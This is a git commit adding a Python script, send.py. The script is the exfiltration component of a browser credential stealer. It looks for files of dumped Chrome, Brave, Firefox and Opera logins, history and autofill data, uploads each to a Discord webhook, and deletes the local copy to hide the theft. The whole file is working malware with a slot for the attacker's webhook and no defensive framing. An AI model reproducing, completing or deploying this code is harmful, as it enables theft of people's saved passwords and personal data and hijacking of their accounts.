14a80970fac20049026b47c35c2f9bfce764068c
reddot777 <petslover4ever123@gmail.com>
2025-01-18 15:24:35 +0300

    Add files via upload

---
+++ send.py
@@ -0,0 +1,34 @@
+import os
+from dhooks import Webhook, File
+import time
+
+hook = Webhook("ENTER UR DISCORD WEBHOOK")
+
+time.sleep(0.5)
+
+
+files_to_check = [
+    'chrome_login.txt',
+    'chrome_history.txt',
+    'chrome_autofill_data.txt',
+    'brave_login.txt',
+    'brave_history.txt',
+    'brave_autofill_data.txt',
+    'firefox_login.txt',
+    'firefox_history.txt',
+    'opera_login.txt',
+    'opera_history.txt',
+    'opera_autofill_data.txt'
+]
+
+for file in files_to_check:
+    if os.path.exists(file):
+
+        file_variable = File(file)
+        hook.send(f"FILE FOUND: {file}", file=file_variable)
+
+        os.remove(file)
+
+        continue
+    else:
+        pass
